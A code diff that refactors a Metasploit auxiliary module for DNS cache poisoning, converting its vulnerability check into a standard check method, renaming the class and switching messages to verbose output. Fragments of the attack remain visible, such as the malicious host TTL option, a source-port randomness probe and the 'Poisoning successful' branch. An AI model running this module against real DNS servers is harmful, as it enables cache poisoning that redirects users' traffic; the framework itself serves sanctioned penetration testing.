@@ -1,16 +1,12 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
 require 'net/dns'
 require 'resolv'
 
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Capture
 
   def initialize(info = {})
@@ -48,7 +44,7 @@ class Metasploit3 < Msf::Auxiliary
           OptInt.new('XIDS', [true, 'The number of XIDs to try for each query (0 for automatic)', 0]),
           OptInt.new('TTL', [true, 'The TTL for the malicious host entry', rand(20000)+30000]),
 
-        ], self.class)
+        ])
 
       deregister_options('FILTER','PCAPFILE')
 
@@ -56,8 +52,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def auxiliary_commands
     return {
-      "check" => "Determine if the specified DNS server (RHOST) is vulnerable",
-      "racer" => "Determine the size of the window for the target server",
+      "racer" => "Determine the size of the window for the target server"
     }
   end
 
@@ -73,14 +68,9 @@ class Metasploit3 < Msf::Auxiliary
     calculate_race(targ, dom)
   end
 
-  def cmd_check(*args)
-    targ = args[0] || rhost()
-    if !(targ and targ.length > 0)
-      print_status("usage: check [dns-server]")
-      return
-    end
+  def check
+    targ = rhost
 
-    print_status("Using the Metasploit service to verify exploitability...")
     srv_sock = Rex::Socket.create_udp(
       'PeerHost' => targ,
       'PeerPort' => 53
@@ -109,7 +99,7 @@ class Metasploit3 < Msf::Auxiliary
           if (name.to_s == txt and data.strings.join('') =~ /^([^\s]+)\s+.*red\.metasploit\.com/m)
             t_addr, t_port = $1.split(':')
 
-            print_status(" >> ADDRESS: #{t_addr}  PORT: #{t_port}")
+            vprint_status(" >> ADDRESS: #{t_addr}  PORT: #{t_port}")
             t_port = t_port.to_i
             if(lport and lport != t_port)
               random = true
@@ -130,12 +120,12 @@ class Metasploit3 < Msf::Auxiliary
     srv_sock.close
 
     if(ports.keys.length == 0)
-      print_error("ERROR: This server is not replying to recursive requests")
-      return
+      vprint_error("ERROR: This server is not replying to recursive requests")
+      return Exploit::CheckCode::Unknown
     end
 
     if(reps < 30)
-      print_warning("WARNING: This server did not reply to all of our requests")
+      vprint_warning("WARNING: This server did not reply to all of our requests")
     end
 
     if(random)
@@ -143,11 +133,16 @@ class Metasploit3 < Msf::Auxiliary
       ports_r = ((ports.keys.length/30.0)*100).to_i
       print_status("PASS: This server does not use a static source port. Randomness: #{ports_u}/30 %#{ports_r}")
       if(ports_r != 100)
-        print_status("INFO: This server's source ports are not really random and may still be exploitable, but not by this tool.")
+        vprint_status("INFO: This server's source ports are not really random and may still be exploitable, but not by this tool.")
+        # Not exploitable by this tool, so we lower this to Appears on purpose to lower the user's confidence
+        return Exploit::CheckCode::Appears
       end
     else
-      print_error("FAIL: This server uses a static source port and is vulnerable to poisoning")
+      vprint_error("FAIL: This server uses a static source port and is vulnerable to poisoning")
+      return Exploit::CheckCode::Vulnerable
     end
+
+    Exploit::CheckCode::Safe
   end
 
   def run
@@ -372,7 +367,7 @@ class Metasploit3 < Msf::Auxiliary
             answer = Resolv::DNS::Message.decode(answer)
             answer.each_answer do |name, ttl, data|
               if((name.to_s + ".") == hostname)
-                print_status("Poisoning successful after #{queries} queries and #{responses} responses: #{name} == #{address}")
+                print_good("Poisoning successful after #{queries} queries and #{responses} responses: #{name} == #{address}")
                 print_status("TTL: #{ttl} DATA: #{data}")
                 close_pcap
                 return
@@ -478,5 +473,4 @@ class Metasploit3 < Msf::Auxiliary
     # XXX: We should subtract the timing from the target to us (calculated based on 0.50 of our non-recursive query times)
     avg_count
   end
-
 end
